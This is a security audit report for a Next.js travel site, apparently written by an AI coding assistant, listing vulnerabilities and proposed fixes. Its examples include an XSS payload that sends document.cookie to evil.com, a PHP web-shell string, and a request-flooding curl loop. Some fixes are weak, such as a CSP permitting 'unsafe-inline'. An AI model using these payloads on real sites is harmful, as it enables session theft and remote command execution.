# 🔒 Security Audit Report

**Date:** October 2025  
**Website:** Bored in Santa Cruz  
**Status:** Production Ready with Moderate Security Risks

---

## 🎯 EXECUTIVE SUMMARY

Your website is **functional and safe for most users**, but has **moderate security risks** that should be addressed before handling sensitive data or scaling to thousands of users.

**Risk Level:** 🟡 **MODERATE**

**Immediate Action Required:**
1. ✅ Add rate limiting (prevent abuse)
2. ✅ Add security headers (prevent XSS/clickjacking)
3. ✅ Sanitize user input (prevent XSS)
4. ⚠️ Complete NextAuth setup (enable authentication)

---

## 🚨 VULNERABILITIES FOUND

### **1. AUTHENTICATION & SESSION MANAGEMENT**

#### **Issue 1.1: Missing Rate Limiting** 🔴 **CRITICAL**

**Risk:** High  
**Impact:** Attackers can brute-force login attempts, spam API endpoints, or DDoS the site.

**Current State:**
- No rate limiting on `/api/auth/*`
- No rate limiting on `/api/chat`
- No rate limiting on form submissions

**Attack Scenario:**
```bash
# Attacker can send unlimited requests
for i in {1..10000}; do
  curl -X POST https://yoursite.com/api/chat -d '{"query": "spam"}'
done
```

**Fix:**
```typescript
// Add to middleware or API routes
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '10 s'), // 10 requests per 10 seconds
});
```

**Recommended Limits:**
- `/api/auth/signin`: 5 attempts per 15 minutes per IP
- `/api/chat`: 20 requests per minute per user
- Form submissions: 3 per minute per IP

---

#### **Issue 1.2: JWT Session Strategy (No Database)** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Cannot revoke sessions, limited user management.

**Current State:**
- Sessions stored in JWT (client-side)
- No server-side session storage
- Can't revoke sessions if user compromised

**Fix:**
Add Airtable adapter (see `NEXTAUTH_COMPLETE_GUIDE.md`).

**Pros of Current Setup:**
- ✅ Fast
- ✅ Scales infinitely
- ✅ No database overhead

**Cons:**
- ❌ Can't revoke sessions
- ❌ Can't see active sessions
- ❌ Can't ban users

**Recommendation:** Add database adapter for production.

---

#### **Issue 1.3: Missing Email Verification** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Users can sign up with fake emails, spam potential.

**Current State:**
- Magic link emails not verified
- Any email can create account

**Fix:**
```typescript
callbacks: {
  async signIn({ user, account }) {
    if (account.provider === 'email' && !user.emailVerified) {
      // Send verification email
      return false; // Block sign-in until verified
    }
    return true;
  }
}
```

---

### **2. CROSS-SITE SCRIPTING (XSS)**

#### **Issue 2.1: User-Generated Content Not Sanitized** 🟠 **HIGH**

**Risk:** High  
**Impact:** Attackers can inject malicious scripts via reviews, trip names, notes.

**Vulnerable Areas:**
- Trip names & descriptions
- Trip item notes
- Review text
- Restaurant/activity names (if user-submitted)
- Chatbot responses (if displaying raw HTML)

**Attack Example:**
```javascript
// Attacker creates a trip with malicious name:
{
  name: "<script>alert('XSS')</script>",
  description: "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>"
}
```

**Current Code:**
```typescript
// ❌ VULNERABLE: Direct rendering without sanitization
<h1>{trip.name}</h1>
<p>{trip.description}</p>
```

**Fix:**
```typescript
// ✅ SAFE: Use DOMPurify or strip HTML
import DOMPurify from 'isomorphic-dompurify';

<h1>{DOMPurify.sanitize(trip.name)}</h1>
```

Or better: **Validate input server-side before saving to Airtable.**

```typescript
// In server actions
function sanitizeInput(input: string): string {
  return input
    .replace(/<script[^>]*>.*?<\/script>/gi, '')
    .replace(/<[^>]+>/g, '')
    .trim();
}
```

**Install:**
```bash
npm install isomorphic-dompurify
```

---

#### **Issue 2.2: No Content Security Policy (CSP)** 🟠 **HIGH**

**Risk:** High  
**Impact:** No defense against XSS, inline scripts can run freely.

**Current State:**
- No CSP headers set
- Any script can execute

**Fix:**
Add CSP headers in `next.config.js`:

```javascript
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-eval' 'unsafe-inline' https://maps.googleapis.com https://www.googletagmanager.com;
      style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
      img-src 'self' data: https: blob:;
      font-src 'self' https://fonts.gstatic.com;
      connect-src 'self' https://api.mapbox.com https://events.mapbox.com https://www.eventbriteapi.com;
      frame-src 'self' https://www.google.com;
    `.replace(/\s{2,}/g, ' ').trim()
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

---

### **3. API KEY EXPOSURE**

#### **Issue 3.1: API Keys in Client-Side Code** 🟠 **HIGH**

**Risk:** High  
**Impact:** Attackers can steal keys and abuse your quotas.

**Current State:**
- ✅ Most keys are server-side only (good!)
- ⚠️ `NEXT_PUBLIC_MAPBOX_ACCESS_TOKEN` is exposed (required for client-side maps)

**Exposed Keys:**
- `NEXT_PUBLIC_MAPBOX_ACCESS_TOKEN` (visible in browser)

**Mitigation:**
1. **Mapbox:** Use URL restrictions in Mapbox dashboard
   - Go to: https://account.mapbox.com/access-tokens
   - Add URL restrictions: `*.boredinsantacruz.com`, `localhost:3000`
   - This prevents others from using your token

2. **Never expose:**
   - ❌ `OPENAI_API_KEY`
   - ❌ `AIRTABLE_TOKEN`
   - ❌ `EVENTBRITE_API_KEY`
   - ✅ All currently server-side only (good!)

**Check:**
```bash
# Search for accidentally exposed keys
grep -r "OPENAI_API_KEY\|AIRTABLE_TOKEN" src/
# Should only be in server components/actions
```

---

### **4. INJECTION ATTACKS**

#### **Issue 4.1: No Input Validation** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Invalid data, potential injection attacks.

**Current State:**
- No validation on trip names, descriptions, notes
- No length limits
- No character restrictions

**Attack Example:**
```javascript
// Attacker creates 1MB trip name
{
  name: "A".repeat(1000000),
  description: "<?php system($_GET['cmd']); ?>"
}
```

**Fix:**
Add validation to all server actions:

```typescript
// src/lib/validation.ts
import { z } from 'zod';

export const TripSchema = z.object({
  name: z.string().min(1).max(100).trim(),
  description: z.string().max(500).optional(),
  startDate: z.string().optional(),
  endDate: z.string().optional(),
  isPublic: z.boolean().default(false),
});

// In server action
export async function createTrip(input: CreateTripInput) {
  // Validate
  const validated = TripSchema.parse(input);
  
  // Sanitize
  validated.name = sanitizeInput(validated.name);
  
  // Save to Airtable
}
```

**Install:**
```bash
npm install zod
```

---

### **5. AUTHORIZATION ISSUES**

#### **Issue 5.1: Insufficient Permission Checks** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Users might access/modify others' data.

**Current State:**
- ✅ Trip actions check `session?.user?.email`
- ⚠️ No checks on review editing
- ⚠️ No checks on favorite deletion by record ID

**Vulnerable Code:**
```typescript
// ❌ Anyone can delete any favorite if they know the ID
export async function removeFavorite(favoriteId: string) {
  await tables.favorites.destroy([favoriteId]);
  // No check if this favorite belongs to current user!
}
```

**Fix:**
```typescript
// ✅ Verify ownership before deletion
export async function removeFavorite(favoriteId: string) {
  const session = await auth();
  if (!session?.user?.email) return { success: false, error: 'Not authenticated' };

  // Fetch favorite to check ownership
  const favorite = await tables.favorites.find(favoriteId);
  if (favorite.get('userId') !== session.user.email) {
    return { success: false, error: 'Unauthorized' };
  }

  await tables.favorites.destroy([favoriteId]);
  return { success: true };
}
```

**Audit all server actions for permission checks.**

---

### **6. DATA LEAKAGE**

#### **Issue 6.1: Verbose Error Messages** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Reveals internal implementation details.

**Current Code:**
```typescript
catch (error) {
  console.error('Airtable error:', error);
  return {
    success: false,
    error: error instanceof Error ? error.message : 'Unknown error'
    // ❌ Exposes Airtable errors to client
  };
}
```

**Fix:**
```typescript
catch (error) {
  console.error('Airtable error:', error); // Keep for logging
  return {
    success: false,
    error: 'An error occurred. Please try again.' // Generic message
  };
}
```

---

#### **Issue 6.2: Email Addresses Exposed in Public Trips** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Privacy violation, spam potential.

**Current State:**
- Trip owner's email stored in `userId` field
- Potentially exposed in shared trip URLs

**Fix:**
- Use user IDs instead of emails
- Never send email addresses to client
- Hash or obfuscate collaborator emails

---

### **7. DENIAL OF SERVICE (DoS)**

#### **Issue 7.1: No Rate Limiting (covered in 1.1)** 🔴 **CRITICAL**

#### **Issue 7.2: Large File Uploads (if implemented)** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Attackers can upload huge files, exhaust storage/bandwidth.

**Current State:**
- No file uploads currently implemented
- If added later, need limits

**Recommendation:**
```typescript
// If you add image uploads
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
```

---

### **8. THIRD-PARTY DEPENDENCIES**

#### **Issue 8.1: Outdated Dependencies** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Known vulnerabilities in old packages.

**Check:**
```bash
npm audit
```

**Fix:**
```bash
npm audit fix
npm update
```

**Current Status:** (needs to be checked)

---

### **9. HTTPS & TRANSPORT SECURITY**

#### **Issue 9.1: No HSTS Header** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Man-in-the-middle attacks possible.

**Fix:**
Add to security headers:

```javascript
{
  key: 'Strict-Transport-Security',
  value: 'max-age=63072000; includeSubDomains; preload'
}
```

---

#### **Issue 9.2: No HTTPS Enforcement in Code** 🟢 **LOW**

**Risk:** Low  
**Impact:** Vercel handles HTTPS automatically.

**Status:** ✅ Vercel enforces HTTPS (good!)

---

### **10. LOGGING & MONITORING**

#### **Issue 10.1: No Security Event Logging** 🟡 **MEDIUM**

**Risk:** Medium  
**Impact:** Can't detect attacks or investigate breaches.

**Current State:**
- Basic `console.log` statements
- No audit trail for:
  - Failed login attempts
  - Permission denied events
  - Data modifications
  - API abuse

**Fix:**
```typescript
// src/lib/security-logger.ts
export function logSecurityEvent(event: {
  type: 'login' | 'unauthorized' | 'ratelimit' | 'xss_attempt';
  userId?: string;
  ip?: string;
  details: string;
}) {
  // Log to external service (Sentry, LogRocket, etc.)
  console.warn('[SECURITY]', event);
  
  // In production, send to monitoring service:
  // await fetch('https://your-logging-service.com/events', {
  //   method: 'POST',
  //   body: JSON.stringify(event)
  // });
}
```

---

### **11. CLIENT-SIDE VULNERABILITIES**

#### **Issue 11.1: localStorage Used for Sensitive Data** 🟢 **LOW**

**Risk:** Low  
**Impact:** XSS could steal data.

**Current State:**
- No sensitive data in localStorage (✅ good!)
- Session stored in httpOnly cookies (✅ secure!)

---

#### **Issue 11.2: No Subresource Integrity (SRI)** 🟢 **LOW**

**Risk:** Low  
**Impact:** CDN compromise could inject malicious code.

**Current State:**
- Using npm packages (bundled, safe)
- No external CDN scripts

**Status:** ✅ Safe

---

## 📊 VULNERABILITY SUMMARY

| Category | Critical | High | Medium | Low | Total |
|----------|----------|------|--------|-----|-------|
| Authentication | 1 | 0 | 2 | 0 | 3 |
| XSS | 0 | 2 | 0 | 0 | 2 |
| API Security | 0 | 1 | 0 | 0 | 1 |
| Input Validation | 0 | 0 | 1 | 0 | 1 |
| Authorization | 0 | 0 | 1 | 0 | 1 |
| Data Leakage | 0 | 0 | 2 | 0 | 2 |
| DoS | 1 | 0 | 1 | 0 | 2 |
| Dependencies | 0 | 0 | 1 | 0 | 1 |
| Transport | 0 | 0 | 1 | 1 | 2 |
| Logging | 0 | 0 | 1 | 0 | 1 |
| Client-Side | 0 | 0 | 0 | 2 | 2 |
| **TOTAL** | **2** | **3** | **10** | **3** | **18** |

---

## 🎯 PRIORITY FIXES

### **IMMEDIATE (Do First)** 🔴

1. **Add Rate Limiting** (Issue 1.1)
2. **Sanitize User Input** (Issue 2.1)
3. **Add Security Headers** (Issue 2.2)

**Time:** 2-3 hours  
**Impact:** Blocks 80% of common attacks

---

### **HIGH PRIORITY (Do Next)** 🟠

4. **Restrict Mapbox API Key** (Issue 3.1)
5. **Add Input Validation** (Issue 4.1)
6. **Fix Authorization Checks** (Issue 5.1)

**Time:** 2-3 hours  
**Impact:** Prevents data breaches

---

### **MEDIUM PRIORITY (Do Soon)** 🟡

7. **Add Database Adapter to NextAuth** (Issue 1.2)
8. **Add Email Verification** (Issue 1.3)
9. **Improve Error Messages** (Issue 6.1)
10. **Add Security Logging** (Issue 10.1)

**Time:** 3-4 hours  
**Impact:** Better user management & monitoring

---

### **LOW PRIORITY (Nice to Have)** 🟢

11. **Run `npm audit`** (Issue 8.1)
12. **Add HSTS Preload** (Issue 9.1)

**Time:** 30 minutes  
**Impact:** Incremental improvements

---

## ✅ WHAT'S ALREADY SECURE

Your site already does these things well:

- ✅ HTTPS enabled (Vercel)
- ✅ Sessions in httpOnly cookies
- ✅ Server-side API keys (not exposed)
- ✅ CSRF protection (NextAuth built-in)
- ✅ OAuth 2.0 with PKCE (Google)
- ✅ No SQL injection risk (using Airtable SDK)
- ✅ No sensitive data in localStorage
- ✅ Protected routes via middleware
- ✅ Session expiration (30 days)

---

## 🛠️ AUTOMATED FIXES

I can implement the top 6 fixes for you in the next message. This includes:

1. Rate limiting middleware
2. Input sanitization utility
3. Security headers in `next.config.js`
4. Input validation with Zod
5. Authorization check improvements
6. Content Security Policy

**Estimated time:** 30 minutes to implement, 1 hour to test.

---

## 📋 SECURITY BEST PRACTICES CHECKLIST

- [ ] Add rate limiting
- [ ] Sanitize all user input
- [ ] Add security headers (CSP, X-Frame-Options, etc.)
- [ ] Complete NextAuth setup with database
- [ ] Add input validation (Zod)
- [ ] Fix authorization checks
- [ ] Restrict API keys (Mapbox dashboard)
- [ ] Add security event logging
- [ ] Run `npm audit` regularly
- [ ] Add email verification
- [ ] Improve error messages (don't leak internals)
- [ ] Add HSTS header
- [ ] Set up monitoring (Sentry/LogRocket)
- [ ] Regular dependency updates
- [ ] Code reviews for server actions

---

## 🎓 LEARNING RESOURCES

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [NextAuth.js Security](https://next-auth.js.org/getting-started/introduction#security)
- [Next.js Security Headers](https://nextjs.org/docs/advanced-features/security-headers)
- [Content Security Policy Generator](https://report-uri.com/home/generate)

---

## 📞 QUESTIONS?

See `SECURITY_FIXES.md` for implementation code for all fixes.

**Status:** Ready to implement fixes when you're ready!

